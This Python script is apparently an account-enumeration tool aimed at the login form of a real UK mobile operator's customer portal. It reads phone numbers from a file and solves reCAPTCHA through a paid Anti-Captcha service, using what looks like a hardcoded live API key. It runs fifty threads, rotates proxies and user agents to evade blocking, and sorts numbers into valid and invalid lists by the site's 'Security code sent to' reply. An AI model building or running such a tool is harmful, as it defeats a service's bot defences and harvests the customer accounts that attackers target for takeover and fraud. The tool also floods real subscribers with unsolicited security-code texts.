import re
import requests
from requests.exceptions import ConnectionError, ProxyError
from os import environ
from os import path
import sys
from bs4 import BeautifulSoup
from python_anticaptcha import AnticaptchaClient, NoCaptchaTaskProxylessTask,FunCaptchaTask, AnticatpchaException
from queue import Queue as Queue
from threading import Thread, Lock 
from datetime import datetime
from goto import with_goto
import random
from tqdm import tqdm
import time
from socket import timeout
import gc
from urllib.parse import urlparse

### configuration
gc.collect()
API_KEY = "98445530786fc78d38f315d5fc1b7644"
SITE_KEY_PATTERN = 'data-sitekey="(.+?)"'
SITE_URL = 'https://www.mytescomobile.com/'
SITE_FORM_ID = '_com_grg_tescomobile_portlets_mytescomobile_login_portlet_LoginPortlet_loginForm'
PROXY_LIST_RESOURCE = './proxies_list.txt'
PHONE_NUM_RESOURCE = './numbers.txt'
THREAD_COUNT = 50
OUTPUT_VALID_FILE_NAME = 'valid.txt'
OUTPUT_INVALID_FILE_NAME = 'invalid.txt'
OUTPUT_UNDETERMINDED_FILE_NAME = 'undeterminded.txt'
SITE_CHECK_VALID_PATTERN = 'Security code sent to'
SITE_CHECK_INVALID_PATTERN = 'Invalid mobile number'
USER_AGENT_RESOURCE = './user_agents.txt'
PROXY_TIMEOUT = 60
PROXY_USE = True
DEBUG = True
DETAILED_LOGO = False
DELETE_NUMBER_OPTION = False
PRINTSTOP = False

class PrintLogger(Thread):
    def __init__(self, count, verified_number_queue, log_queue):
        Thread.__init__(self)
        self.count = count
        self.verified_number_queue = verified_number_queue
        self.log_queue = log_queue
    def run(self):
        t = tqdm(range(self.count))
        #t.set_description("starting ...")
        
        for i in range(self.count):

            while not PRINTSTOP:
                #t.set_description(self.log_queue.get())
                if self.verified_number_queue.qsize() > i:
                        t.update(1)
                        break
                else:
                    time.sleep(1)
            
            
        t.close()
        
                

class Master_Worker(Thread):
    ''' Checks proxies for Elite Status and other confirmations to ensure anonymity '''

    def __init__(self,proxy_queue,number_queue, verified_number_queue, user_agents, log_queue, lock):
        Thread.__init__(self)
        self.log_queue = log_queue
        self.proxy_queue = proxy_queue   
        self.number_queue = number_queue       
        #self.used_proxy_queue = used_proxy_queue
        self.verified_number_queue = verified_number_queue         
        self.user_agents = user_agents
        self.current_user_agent = random.choice(user_agents)[:-1]
        self.lock = lock
    def is_finished(self):
        # if PROXY_USE:
        #     if self.proxy_queue.qsize() < 1:
        #         self.print_logo("step01", "no available proxies, plz update your proxies in" + PROXY_LIST_RESOURCE)
        #         return True
        if self.number_queue.qsize() < 1:
            self.print_logo("step02", "completed all numbers: " + str(self.verified_number_queue.qsize()))
            self.thread_exit()
            return True
        return False

    @with_goto
    def run(self):
        
        self.print_logo("starting thread ...", "")

        if PROXY_USE:
            proxy = self.proxy_queue.get()



        #step 00 - checking if there are proxies and numbers in queues
        label .step00
        if self.is_finished():
            self.thread_exit()
       
        #step 01 - create new session
        label .step01
        if DETAILED_LOGO:            
            self.print_logo("step01", "starting new round ...")
        
        #step 02 - initial new number
        label .step02
        if DETAILED_LOGO:
            self.print_logo("step02", "preparing new number ...")  
        if self.is_finished():
            thread_exit()

        number = self.number_queue.get()
        #check number's validation
        if not (number[0:2] == '07') or not (len(number) == 11):
            if DETAILED_LOGO:
                self.print_logo("step02", "terrible number ("+number+")")                
            goto .step02
        if DETAILED_LOGO:    
            self.print_logo("step02", "Prepared number("+number+")")
        

        #step 03 - initial new proxy
        label .step03
        if PROXY_USE:
            if DETAILED_LOGO:
                self.print_logo("remain proxies count("+ str(self.proxy_queue.qsize())+")", "")
        self.print_logo("running","...")

        # if self.is_finished():
        #     self.thread_exit()

        if DETAILED_LOGO:    
            self.print_logo("step03", "creating new session ...")    


        self.current_user_agent = random.choice(self.user_agents)[:-1]
        
        sess = requests.session()

        # if PROXY_USE:
        #     proxy = self.proxy_queue.get()

        #     if DETAILED_LOGO:
        #         self.print_logo("step03", "Prepared proxy("+proxy+")")
        

        #step 04 - check proxy
        label .step04

        if DETAILED_LOGO:            
            self.print_logo("step04", "getting html contained form ...")
        #extract form action url and site_key
        if PROXY_USE:
            html_doc = self.get_html(sess, proxy)
        else:
            html_doc = self.get_html(sess)
        if html_doc == None:
                
            #go to step 03
            if PROXY_USE:
                self.print_logo("step04","can't use proxy("+proxy+")")
                #restore proxy
                self.proxy_queue.put(proxy)
                proxy = self.proxy_queue.get()
            goto .step03

        if PROXY_USE:
                self.print_logo("step04",":) Found useful proxy("+proxy+")")

        soup = BeautifulSoup(html_doc, 'html.parser')
        action_link = soup.find("form", id=SITE_FORM_ID)['action']

        site_key = re.search(SITE_KEY_PATTERN, html_doc).group(1)

        if DETAILED_LOGO:
            self.print_logo("thread name:" + self.getName() + ", Step04:site_key=>"+site_key+",action_url=>"+action_link, "")

        #check proxy
        
        if not str(site_key).strip() or not str(action_link).strip():
            self.print_logo("step04", "warnning => checking target site, it may update content")
            if PROXY_USE:
                #restore proxy
                self.proxy_queue.put(proxy)
                proxy = self.proxy_queue.get()
            # go to step 03
            goto .step03

        #get token
        token = self.get_token(site_key, proxy)
        if(token == None):
            if DETAILED_LOGO:
                self.print_logo("step04", "captcha empty token")
            #go to step 03
            if PROXY_USE:
                #restore proxy
                self.proxy_queue.put(proxy)
                proxy = self.proxy_queue.get()
            goto .step03
        if DETAILED_LOGO:
            self.print_logo("step04","Prepared token("+token+")")    
        

        #step 05 - check number
        label .step05
        #submit form
        if DETAILED_LOGO:
            self.print_logo("step05", "submitting form ...")
        #get current timestamp
        now = datetime.timestamp(datetime.now())

        formdata = {
            '_com_grg_tescomobile_portlets_mytescomobile_login_portlet_LoginPortlet_formDate': str(now).split('.')[0],
            '_com_grg_tescomobile_portlets_mytescomobile_login_portlet_LoginPortlet_recaptchaToken':token,
            '_com_grg_tescomobile_portlets_mytescomobile_login_portlet_LoginPortlet_redirectToAfterLogin':'',
            '_com_grg_tescomobile_portlets_mytescomobile_login_portlet_LoginPortlet_msisdn': number, 
            'g-recaptcha-response': token,
            '_com_grg_tescomobile_portlets_mytescomobile_login_portlet_LoginPortlet_checkboxNames':'remember'
        }

        #get response
        if PROXY_USE:

            response_html = self.form_submit(sess, action_link, formdata, proxy)
        else:
            response_html = self.form_submit(sess, action_link, formdata)
        
        if response_html == None:
            self.print_logo("step05", "No received final result content")
            if PROXY_USE:
                #restore proxy
                self.proxy_queue.put(proxy)
                proxy = self.proxy_queue.get()
            #go to step 03
            goto .step03
        #self.write_output(response_html, True)
        #check number and save it in file
        if self.check_number(response_html, number):
            if DETAILED_LOGO:
                self.print_logo("step05", "success("+number+")")
            
            
            
            
            
        else:
            self.print_logo("step05", "undeterminded("+number+")")                   

                
        self.verified_number_queue.put(number)

        self.print_logo("Moving next number ... ","total found ("+str(self.verified_number_queue.qsize())+")")    
        #go to step 00    
        goto .step00
            


        
    def get_html(self, sess, proxy=None):
        try:
            if PROXY_USE:            
                content = sess.get(SITE_URL, proxies = {"https":"https://"+proxy}, headers={'User-Agent': self.current_user_agent}, timeout = PROXY_TIMEOUT).text    
            else:
                content = sess.get(SITE_URL,  headers={'User-Agent': self.current_user_agent}, timeout = PROXY_TIMEOUT).text   
        except ConnectionError as e:    # This is the correct syntax        
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)
            return None
        except ValueError as e:
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)
            return 
        except ProxyError as e:
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)
                return 
        except Exception as e:
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)
            return None
        except timeout as e:
            if DETAILED_LOGO:
                self.print_logo("Exc",e)
        
        return content

    def get_token(self, site_key, proxy = None):
        # proxy = urlparse("https://"+proxy)
        # print(proxy.hostname)
        #proxy = {"proxy_type":proxy.scheme, "proxy_address":proxy.hostname, "proxy_port": proxy.port, "proxy_login": proxy.username, "proxy_password":proxy.password}
        client = AnticaptchaClient(API_KEY)
        # task = FunCaptchaTask(SITE_URL,site_key, proxy_type=proxy.scheme, proxy_address=proxy.hostname,proxy_port=proxy.port,proxy_login=proxy.username,proxy_password=proxy.password, user_agent=self.current_user_agent)
        task = NoCaptchaTaskProxylessTask(
            website_url=SITE_URL,
            website_key=site_key
        )

        try:
           
            #job = client.createTaskSmee(task)
            job = client.createTask(task)
            job.join(maximum_time=150)
            
        except AnticatpchaException as e:
            if e.error_code == 'ERROR_ZERO_BALANCE':
                print(e.error_id, e.error_code, e.error_description)
            else:
                if DETAILED_LOGO:
                    self.print_logo("Exc:",e)
                return None
        except Exception as e:
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)
            return None  
        except timeout as e:
            if DETAILED_LOGO:
                self.print_logo("Exc",e)
            return None

        return job.get_solution_response()
    def delete_number_in_file(self, number):
        
        
        f = open(PHONE_NUM_RESOURCE, "r",encoding="utf-8")
        lines = f.readlines()
        f.close()

        self.lock.acquire()
        ff = open(PHONE_NUM_RESOURCE, "w",encoding="utf-8")
        for line in lines:
            if line.strip("\n") != number:
                ff.write(line)
        ff.close()
        self.lock.release()


    def check_number(self, response_html, number):
        result = re.search(SITE_CHECK_VALID_PATTERN, response_html)

        if result:
            self.print_logo("Found Valid Number("+number+")","")
            self.write_output(number, 0)
            if DELETE_NUMBER_OPTION:
                self.delete_number_in_file(number)
            return True

        result = re.search(SITE_CHECK_INVALID_PATTERN, response_html)
        if result:
            self.print_logo("Found Invalid Number("+number+")","")
            self.write_output(number, 1)
            if DELETE_NUMBER_OPTION:
                self.delete_number_in_file(number)
            return True

        self.write_output(number, 2)
        if DELETE_NUMBER_OPTION:
            self.delete_number_in_file(number)
        return False

    def write_output(self, msg,method):
     

        if method == 0:
            f_path = OUTPUT_VALID_FILE_NAME
        elif method == 1:
            f_path = OUTPUT_INVALID_FILE_NAME
        else:
            f_path = OUTPUT_UNDETERMINDED_FILE_NAME     
        
        if path.isfile(f_path) == True:
          
            with open(f_path,"a",encoding="utf-8") as valid_file:
              valid_file.write(str(msg)+"\n")
              
        if path.isfile(f_path) == False:       
          
            with open(f_path,"w",encoding="utf-8") as valid_file:
              valid_file.write(str(msg)+"\n")


    def form_submit(self, sess, formurl, formdata, proxy = None):
        try:
            if PROXY_USE:
                response_html = sess.post(formurl, data=formdata, proxies = {"https":"https://"+proxy}, headers={'User-Agent': self.current_user_agent}, timeout = PROXY_TIMEOUT).text
            else:
                response_html = sess.post(formurl, data=formdata, headers={'User-Agent': self.current_user_agent}, timeout = PROXY_TIMEOUT).text
        except ConnectionError as e:    
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)
            return None
        except ValueError as e:
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)

            return None
        except ProxyError as e:
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)
                return
        except Exception as e:
            if DETAILED_LOGO:
                self.print_logo("Exc:",e)
            return None
        except timeout as e:
            if DETAILED_LOGO:
                self.print_logo("Exc",e)

        return response_html

    def print_logo(self, step_label, msg):
        if DEBUG:
            print("Thr_N:{0} > {1} : {2}".format(self.getName(), step_label,msg))
            #print("Thr_N:" + self.getName() + ">"+step_label+":"+msg)
            

    def thread_exit(self):
        self.print_logo("Terminated", "_^_")

        sys.exit()

def load_numbers(number_queue):
    # get numbers to be checked
    with open(PHONE_NUM_RESOURCE,"r",encoding="utf-8") as num_file:
      num_list = list(num_file)
    
    # send the numbers to the number queue ready to be taken by the workers        
    for number in num_list:
      number_queue.put(number.replace("\n",""))
def load_proxies(proxy_queue):
    # get proxies to be used to request
    with open(PROXY_LIST_RESOURCE,"r",encoding="utf-8") as proxy_file:
      proxy_list = list(proxy_file)

    random.shuffle(proxy_list)        
    # send the numbers to the number queue ready to be taken by the workers        
    for proxy in proxy_list:
      proxy_queue.put(proxy.replace("\n",""))

def load_user_agents():
    # get proxies to be used to request
    with open(USER_AGENT_RESOURCE,"r",encoding="utf-8") as user_agent_file:
      user_agent_list = list(user_agent_file)
       
    # send the numbers to the number queue ready to be taken by the workers        
    return user_agent_list

if __name__ == '__main__':

        # set-up queues to pass data between threads
        number_queue = Queue()
        if PROXY_USE:
            proxy_queue = Queue()
        used_proxy_queue = Queue()
        verified_number_queue = Queue()
        log_queue = Queue()

        load_numbers(number_queue)
        if PROXY_USE:
            load_proxies(proxy_queue)
        user_agents = load_user_agents()


        lock = Lock() 

        logworker = PrintLogger(number_queue.qsize(), verified_number_queue, log_queue)
        logworker.daemon = False
        logworker.start()
 
        th_idx = 0
        # start the master worker threads                
        for x in range(THREAD_COUNT):
            if PROXY_USE:
                n_worker = Master_Worker( proxy_queue, number_queue, verified_number_queue, user_agents, log_queue, lock)

            else:
                 n_worker = Master_Worker( None, number_queue, verified_number_queue, user_agents, log_queue, lock)
            n_worker.daemon = False
            n_worker.start()
            th_idx = th_idx + 1

        
        sys.exit()
